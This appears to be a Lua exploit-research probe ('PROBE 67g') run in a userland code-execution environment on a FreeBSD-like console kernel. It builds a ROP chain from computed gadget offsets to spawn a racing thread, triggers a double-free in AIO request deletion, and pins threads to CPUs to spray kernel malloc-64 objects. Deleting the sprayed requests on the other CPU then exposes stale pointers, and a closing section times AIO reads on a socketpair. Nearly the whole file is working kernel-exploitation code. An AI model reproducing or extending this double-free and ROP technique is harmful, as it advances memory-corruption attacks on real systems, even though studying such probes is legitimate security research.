-- CRASH_CLASS: MODERATE
-- PROBE 67g: Cross-CPU overlap via sequential delete observation
--
-- The double-free puts the SAME addresses on TWO CPUs' malloc-64 free lists.
-- If we submit on CPU 0, then CPU 1, some objects land at the same address.
-- Deleting CPU 0's requests first frees those shared objects. Then deleting
-- CPU 1's requests follows stale pointers → anomalous status or crash.
--
-- Also tests: AIO read on socketpair fd (for timing-controlled I/O).

print("=== PROBE 67g: CROSS-CPU OVERLAP ===")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h,val.l end return 0,N(val) end
local function w64(addr,lo,hi) wd(addr,lo or 0); wd(addr+4,hi or 0) end
local function sgn(v) local l=N(v) if l>=0x80000000 then l=l-0x100000000 end return l end
local function put_str(s) local p=memory.alloc(#s+2) for i=1,#s do pcall(function() memory.write_byte(N(p)+i-1,string.byte(s,i)) end) end pcall(function() memory.write_byte(N(p)+#s,0) end) return p end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0; local eb_hi = rd(N(ib) + 0x10C) or 0
local function g(off) return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off)) end
local function g_lohi(off) local lo=eb_lo+off; local hi2=eb_hi; if lo>=0x100000000 then hi2=hi2+math.floor(lo/0x100000000); lo=lo%0x100000000 end; return lo,hi2 end
local pop_rax=g(0x992); local pop_rdi=g(0xC9DFE); local pop_rsi=g(0xD77D)
local pop_rdx=g(0x3B02D7); local pop_rcx=g(0xE64); local mov_m_rax=g(0x92C67)
local bare_ret=g(0x42); local sf_lo,sf_hi=g_lohi(0x992)
local sa=memory.alloc(0x20); wq(N(sa),uint64(1)); wd(N(sa)+8,0); wq(uint64(N(sa)+16),uint64(0))
pcall(function() mk(416)(uint64(11),sa,uint64(0)) end)
pcall(function() mk(416)(uint64(12),sa,uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
local tcb_buf=memory.alloc(0x1000); for i=0,0xFFC,4 do wd(N(tcb_buf)+i,0) end
local tcb_mid=N(tcb_buf)+0x800; wd(tcb_mid,tcb_mid%0x100000000); wd(tcb_mid+4,math.floor(tcb_mid/0x100000000))
local tcb_ptr=memory.alloc(8); wq(tcb_ptr,uint64(tcb_mid))
local shared=memory.alloc(0x400); for i=0,0x3FC,4 do wd(N(shared)+i,0) end

local pin_mask=memory.alloc(8)
local function set_cpu(mask) wq(pin_mask,uint64(mask))
    pcall(function() mk(488)(uint64(3),uint64(2),uint64(pid_val),uint64(8),uint64(N(pin_mask))) end) end

local reqs=memory.alloc(0x30); local data_buf=memory.alloc(0x1000)
local result_buf=memory.alloc(0x100); local one_id=memory.alloc(8); local one_st=memory.alloc(8)

local function submit_one()
    wq(N(reqs),uint64(0)); wq(uint64(N(reqs)+8),uint64(16))
    local bh,bl=get_hi_lo(uint64(N(data_buf))); wd(N(reqs)+0x10,bl); wd(N(reqs)+0x14,bh)
    local rh,rl=get_hi_lo(uint64(N(result_buf))); wd(N(reqs)+0x18,rl); wd(N(reqs)+0x1C,rh)
    wd(N(reqs)+0x20,fd_zero); wd(N(reqs)+0x24,0); wd(N(one_id),0)
    pcall(function() mk(669)(uint64(1),uint64(N(reqs)),uint64(1),uint64(1),uint64(N(one_id))) end)
    return rd(N(one_id)) or 0
end
local function poll_664(id) wd(N(one_id),id); wd(N(one_st),0)
    pcall(function() mk(664)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
    return rd(N(one_st)) or 0 end
local function delete_one(id) wd(N(one_id),id); wd(N(one_st),0xCD)
    pcall(function() mk(662)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD end
local function spawn_662_child(ids_addr,count,states_addr,done_off)
    local cstk=memory.alloc(0x1000); for i=0,0xFFC,4 do wd(N(cstk)+i,0) end
    local cbase=N(cstk); local sp=((cbase+0x800)-((cbase+0x800)%16))-8
    local function push(val) wq(sp,val); sp=sp+8 end
    push(uint64(165)); push(pop_rdi); push(uint64(129))
    push(pop_rsi); push(uint64(N(tcb_ptr))); push(pop_rdx); push(uint64(0))
    push(pop_rcx); push(uint64(0)); push(stub)
    push(pop_rax); push(uint64(662)); push(pop_rdi); push(uint64(ids_addr))
    push(pop_rsi); push(uint64(count)); push(pop_rdx); push(uint64(states_addr))
    push(pop_rcx); push(uint64(0)); push(stub)
    push(pop_rdi); push(uint64(N(shared)+done_off+8)); push(mov_m_rax)
    push(pop_rdi); push(uint64(N(shared)+done_off))
    push(pop_rax); push(uint64(0xDDDD)); push(mov_m_rax)
    push(pop_rax); push(uint64(431)); push(pop_rdi); push(uint64(0)); push(stub)
    wd(N(shared)+done_off,0)
    local pa=memory.alloc(0x38); for i=0,0x34,4 do wd(N(pa)+i,0) end
    w64(N(pa),sf_lo,sf_hi)
    w64(N(pa)+0x10,cbase%0x100000000,math.floor(cbase/0x100000000))
    w64(N(pa)+0x18,0x800,0)
    pcall(function() mk(455)(uint64(N(pa)),uint64(0x38)) end)
end

-- =============================================
-- [A] DOUBLE-FREE RACE
-- =============================================
print(""); print("-- [A] DOUBLE-FREE (mask=0x03) --")
set_cpu(3)

local BATCH=16
local ids=memory.alloc(BATCH*4); local id_list={}
for i=0,BATCH-1 do local id=submit_one(); if id==0 then break end
    wd(N(ids)+i*4,id); id_list[#id_list+1]=id end
local pb=memory.alloc(BATCH*4)
pcall(function() mk(664)(uint64(N(ids)),uint64(BATCH),uint64(N(pb))) end)
local ms=memory.alloc(BATCH*4); local cs=memory.alloc(BATCH*4)
for i=0,BATCH*4-1,4 do wd(N(ms)+i,0xCD); wd(N(cs)+i,0xCD) end
spawn_662_child(N(ids),BATCH,N(cs),0x100)
pcall(function() mk(662)(uint64(N(ids)),uint64(BATCH),uint64(N(ms))) end)
for w=1,200000 do end
local doubles=0
for i=0,BATCH-1 do
    if (rd(N(ms)+i*4) or 0xCD)==0 and (rd(N(cs)+i*4) or 0xCD)==0 then doubles=doubles+1 end
end
print("doubles=" .. doubles)
if doubles < 2 then print("ABORT"); print("=== 67g DONE ==="); return end

-- =============================================
-- [B] SPRAY: CPU 0 then CPU 1
-- =============================================
print(""); print("-- [B] SPRAY: CPU 0 (64), then CPU 1 (64) --")

set_cpu(1)  -- CPU 0
local cpu0_ids = {}
for i = 1, 64 do
    local id = submit_one(); if id == 0 then break end
    cpu0_ids[#cpu0_ids + 1] = id
end

set_cpu(2)  -- CPU 1
local cpu1_ids = {}
for i = 1, 64 do
    local id = submit_one(); if id == 0 then break end
    cpu1_ids[#cpu1_ids + 1] = id
end

print(string.format("  cpu0=%d cpu1=%d", #cpu0_ids, #cpu1_ids))

-- Poll all
set_cpu(3)
for _, id in ipairs(cpu0_ids) do poll_664(id) end
for _, id in ipairs(cpu1_ids) do poll_664(id) end

-- =============================================
-- [C] DELETE CPU 0 FIRST, then observe CPU 1 deletes
-- =============================================
print(""); print("-- [C] DELETE CPU0 FIRST --")
set_cpu(1)  -- Delete from CPU 0 (returns freed blocks to CPU 0's cache)

local del0_ok, del0_fail = 0, 0
for _, id in ipairs(cpu0_ids) do
    local st = delete_one(id)
    if st == 0 then del0_ok = del0_ok + 1 else del0_fail = del0_fail + 1 end
end
print(string.format("  cpu0_del: ok=%d fail=%d", del0_ok, del0_fail))

if not alive() then print("DEAD after cpu0 delete"); return end

-- Now delete CPU 1 — if objects overlap, these follow stale pointers
print("")
print("-- [D] DELETE CPU1 (stale pointer test) --")
set_cpu(2)  -- Delete from CPU 1

local del1_ok, del1_fail, del1_crash = 0, 0, 0
local anomalous_status = {}
for _, id in ipairs(cpu1_ids) do
    if not alive() then del1_crash = del1_crash + 1; break end
    local st = delete_one(id)
    if st == 0 then del1_ok = del1_ok + 1
    else
        del1_fail = del1_fail + 1
        if #anomalous_status < 10 then
            anomalous_status[#anomalous_status + 1] =
                string.format("id=%d st=%08X", id, st)
        end
    end
end
print(string.format("  cpu1_del: ok=%d fail=%d crash=%d", del1_ok, del1_fail, del1_crash))
if #anomalous_status > 0 then
    for _, s in ipairs(anomalous_status) do print("  ★ " .. s) end
end

-- =============================================
-- [E] REVERSE ORDER: delete CPU1 first, then CPU0
-- =============================================
if alive() then
    print(""); print("-- [E] REVERSE: CPU1 first, CPU0 second --")

    -- New double-free
    set_cpu(3)
    local ids2 = memory.alloc(BATCH*4)
    for i=0,BATCH-1 do local id=submit_one(); if id==0 then break end; wd(N(ids2)+i*4,id) end
    pcall(function() mk(664)(uint64(N(ids2)),uint64(BATCH),uint64(N(pb))) end)
    for i=0,BATCH*4-1,4 do wd(N(ms)+i,0xCD); wd(N(cs)+i,0xCD) end
    spawn_662_child(N(ids2),BATCH,N(cs),0x200)
    pcall(function() mk(662)(uint64(N(ids2)),uint64(BATCH),uint64(N(ms))) end)
    for w=1,200000 do end
    local d2=0
    for i=0,BATCH-1 do
        if (rd(N(ms)+i*4) or 0xCD)==0 and (rd(N(cs)+i*4) or 0xCD)==0 then d2=d2+1 end
    end
    print("  doubles2=" .. d2)

    if d2 >= 2 then
        -- Spray: CPU 1 first, then CPU 0
        set_cpu(2); local rev1={}
        for i=1,64 do local id=submit_one(); if id==0 then break end; rev1[#rev1+1]=id end
        set_cpu(1); local rev0={}
        for i=1,64 do local id=submit_one(); if id==0 then break end; rev0[#rev0+1]=id end
        print(string.format("  rev: cpu1=%d cpu0=%d", #rev1, #rev0))

        -- Poll all
        set_cpu(3)
        for _,id in ipairs(rev1) do poll_664(id) end
        for _,id in ipairs(rev0) do poll_664(id) end

        -- Delete CPU 1 first
        set_cpu(2); local r1_ok,r1_fail=0,0
        for _,id in ipairs(rev1) do
            local st=delete_one(id); if st==0 then r1_ok=r1_ok+1 else r1_fail=r1_fail+1 end
        end
        print(string.format("  rev_cpu1_del: ok=%d fail=%d", r1_ok, r1_fail))

        -- Then CPU 0
        set_cpu(1); local r0_ok,r0_fail=0,0
        local r0_anom = {}
        for _,id in ipairs(rev0) do
            if not alive() then break end
            local st=delete_one(id)
            if st==0 then r0_ok=r0_ok+1
            else r0_fail=r0_fail+1
                if #r0_anom<5 then r0_anom[#r0_anom+1]=string.format("id=%d st=%08X",id,st) end
            end
        end
        print(string.format("  rev_cpu0_del: ok=%d fail=%d", r0_ok, r0_fail))
        for _,s in ipairs(r0_anom) do print("  ★ " .. s) end
    end
end

-- =============================================
-- [F] SOCKETPAIR AIO TEST
-- =============================================
if alive() then
    print(""); print("-- [F] SOCKETPAIR AIO TEST --")
    -- Create AF_UNIX socketpair
    local spbuf = memory.alloc(16)
    wd(N(spbuf), 0xFFFFFFFF); wd(N(spbuf)+4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf)))
    end)
    local sp_ret = ok_sp and sgn(rv_sp) or -999
    local sp_fd0 = rd(N(spbuf)) or -1
    local sp_fd1 = rd(N(spbuf)+4) or -1
    print(string.format("  socketpair: ret=%d fd0=%d fd1=%d", sp_ret, sp_fd0, sp_fd1))

    if sp_ret == 0 and sp_fd0 > 0 and sp_fd1 > 0 then
        -- Try AIO read on socketpair fd0 (should block — no data)
        local aio_res = memory.alloc(8); wd(N(aio_res), 0xDEAD)
        local aio_data = memory.alloc(64); for i=0,60,4 do wd(N(aio_data)+i,0xCCCC) end
        wq(N(reqs), uint64(0))  -- cmd=0 (read? or cmd=1?)
        wq(uint64(N(reqs)+8), uint64(16))
        local bh,bl = get_hi_lo(uint64(N(aio_data)))
        wd(N(reqs)+0x10, bl); wd(N(reqs)+0x14, bh)
        local rh,rl = get_hi_lo(uint64(N(aio_res)))
        wd(N(reqs)+0x18, rl); wd(N(reqs)+0x1C, rh)
        wd(N(reqs)+0x20, sp_fd0); wd(N(reqs)+0x24, 0)
        wd(N(one_id), 0)
        local ok_aio, rv_aio = pcall(function()
            return mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
        end)
        local aio_ret = ok_aio and sgn(rv_aio) or -999
        local aio_id = rd(N(one_id)) or 0
        local res_val = rd(N(aio_res)) or 0xDEAD
        print(string.format("  aio_read(socketpair): ret=%d id=%d result=%08X", aio_ret, aio_id, res_val))

        if aio_id > 0 then
            -- Check if it's still pending (result unchanged)
            local res_check = rd(N(aio_res)) or 0xDEAD
            print(string.format("  result_still=%08X (0xDEAD = still pending)", res_check))

            -- Write data to socketpair fd1 → should unblock the AIO read
            local wbuf = memory.alloc(16)
            for i = 0, 12, 4 do wd(N(wbuf)+i, 0x41424344) end
            local ok_w, rv_w = pcall(function()
                return mk(4)(uint64(sp_fd1), uint64(N(wbuf)), uint64(16))
            end)
            local w_ret = ok_w and sgn(rv_w) or -999
            print(string.format("  write(fd1): ret=%d", w_ret))

            -- Small delay
            for w = 1, 50000 do end

            -- Check result again
            local res_after = rd(N(aio_res)) or 0xDEAD
            print(string.format("  result_after_write=%08X", res_after))

            -- Check what was read
            local read_data = rd(N(aio_data)) or 0xCCCC
            print(string.format("  read_data=%08X (expect 0x41424344 if AIO worked)", read_data))

            -- Cleanup
            poll_664(aio_id); delete_one(aio_id)
        end

        -- Close socketpair
        pcall(function() mk(6)(uint64(sp_fd0)) end)
        pcall(function() mk(6)(uint64(sp_fd1)) end)
    end
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67g DONE ===")
